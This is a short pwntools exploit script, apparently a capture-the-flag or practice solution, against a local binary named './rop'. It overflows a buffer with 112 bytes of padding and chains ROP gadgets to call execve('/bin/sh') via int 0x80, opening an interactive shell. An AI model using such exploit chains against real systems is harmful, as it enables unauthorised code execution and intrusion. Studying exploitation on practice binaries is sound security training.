#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

pop_eax_ret = 0x080bb196
#  ROPgadget --binary ./rop --only "pop|ret" | grep "ebx"
pop_edx_ecx_ebx_ret = 0x0806eb90
#  ROPgadget --binary ./rop --string "/bin/sh"
sh_addr = 0x080be408
#  ROPgadget --binary ./rop --only "int"
int_80_addr = 0x08049421

payload = flat(["a" * 112, pop_eax_ret, 11, pop_edx_ecx_ebx_ret, 0, 0, sh_addr, int_80_addr])

io = process("./rop")
io.sendlineafter("do?\n", payload)
io.interactive()
io.close()
